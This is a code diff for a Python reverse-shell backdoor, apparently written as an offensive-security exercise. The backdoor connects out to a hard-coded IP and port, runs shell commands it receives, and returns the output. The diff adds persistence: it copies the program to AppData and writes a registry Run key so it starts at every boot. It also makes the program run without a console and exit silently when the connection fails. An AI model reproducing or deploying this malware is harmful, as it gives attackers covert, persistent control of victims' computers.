@@ -3,13 +3,24 @@ import subprocess
 import json
 import os
 import base64
+import sys
+import shutil
 
 
 class Backdoor:
     # Set socket
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a instance of the socket
         self.connection.connect((ip, port))
+
+    # Make the file run on every system startup
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\program.exe"  # C:\User\user_name\AppData\Roaming
+        if not os.path.exists(evil_file_location):  # Check if persistence is not already set up
+            shutil.copyfile(sys.executable, evil_file_location)  # copy curent executable file to \AppData\Roaming
+            # Add registry entry to execute the file every system startup
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     # Send data as JSON Object
     def reliable_send(self, data):
@@ -22,7 +33,8 @@ class Backdoor:
 
     # Execute a command and return its output
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        DEVNULL = open(os.devnull, 'wb')  # Create filestream location for .exe as it got no more console
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
 
     # Change the working directory to a given path
     def change_working_directory_to(self, path):
@@ -52,7 +64,7 @@ class Backdoor:
                 # Incoming command exit
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
 
                 # Incoming command cd with path
                 elif command[0] == "cd" and len(command) > 1:
@@ -75,5 +87,9 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("192.168.190.140", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("192.168.190.140", 4444)
+    my_backdoor.run()
+
+except Exception:  # Exit without error message when the backdoor can not connect
+    sys.exit()
